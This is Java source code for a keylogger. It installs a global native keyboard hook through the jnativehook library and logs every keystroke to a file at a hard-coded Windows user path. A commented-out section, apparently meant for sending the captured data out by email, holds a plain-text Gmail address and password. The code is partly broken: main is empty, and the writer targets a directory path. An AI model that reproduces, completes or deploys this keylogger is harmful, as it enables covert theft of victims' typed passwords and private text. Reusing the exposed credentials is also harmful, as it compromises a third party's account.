import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.util.Properties;
import java.util.logging.Level;
import java.util.logging.Logger;

import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.swing.JFrame;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger extends JFrame implements ActionListener, NativeKeyListener
{
	
	public static void main(String[] args)
	{
		
		
	}
	
//	public static void Mail(String recepient) throws MessagingException
//	{
//		System.out.println("Preparing to send email");
//		Properties properties = new Properties();
//		properties.put("mail.smtp.auth", "true");
//		properties.put("mail.smtp.starttls.enable", "true");
//		properties.put("mail.smtp.host", "smtp.gmail.com");
//		properties.put("mail.smtp.port", "587");
//		String account = "lvwelk66@gmail.com";
//		String password = "Maillguy504027";
//		Session session = Session.getInstance(properties, new Authenticator()
//		{
//			@Override
//			protected PasswordAuthentication getPasswordAuthentication()
//			{
//				return new PasswordAuthentication(account, password);
//			}
//		});
//		Message message = prepareMessage(session, account, recepient);
//		Transport.send(message);
//		System.out.println("Message sent successfully");
//	}
//	
//	private static Message prepareMessage(Session session, String account, String recepient) throws MessagingException 
//	{
//			Message message = new MimeMessage(session);
//			message.setFrom(new InternetAddress(account));
//			message.setRecipient(Message.RecipientType.TO, new InternetAddress(recepient));
//			message.setSubject("my first email from java");
//			message.setText("hey there, \n Look at my email");
//			return message;
//	}

	public void KEY()
	{
		try  
		{
			GlobalScreen.registerNativeHook();
		} 
		catch (NativeHookException e1) 
		{
			e1.printStackTrace();
		}
		
		GlobalScreen.addNativeKeyListener(new KeyLogger());
	}
	
	public void nativeKeyPressed(NativeKeyEvent e)
	{
		
		try 
		{
			
			File file = new File("C:\\Users\\dmwwe\\Desktop");
			PrintWriter pw = new PrintWriter(file);
			if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Escape"))
			{
				pw.print("");
				pw.flush();
				pw.close();
				return;
			}
			else if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Space"))
			{
				pw.print(" ");
			}
			else if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Enter"))
			{
				pw.println("");
			}
			else if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Comma"))
			{
				pw.print(",");
			}
			else if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Delete"))
			{
				pw.print(NativeKeyEvent.getKeyText(e.getKeyCode()).replace(NativeKeyEvent.getKeyText(e.getKeyCode()), ""));
			}
			else if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Semicolon"))
			{
				pw.print(":");
			}
			else
			{
				pw.print(NativeKeyEvent.getKeyText(e.getKeyCode()));
			}
			
		}
		catch (FileNotFoundException e1) 
		{
			e1.printStackTrace();
		}
		
		
		
		
	}
	
	public void nativeKeyReleased(NativeKeyEvent e)
	{
		
	}
	
	public void nativeKeyTyped(NativeKeyEvent e)
	{
		
	}

	

	@Override
	public void actionPerformed(ActionEvent e) 
	{
		
	}

}
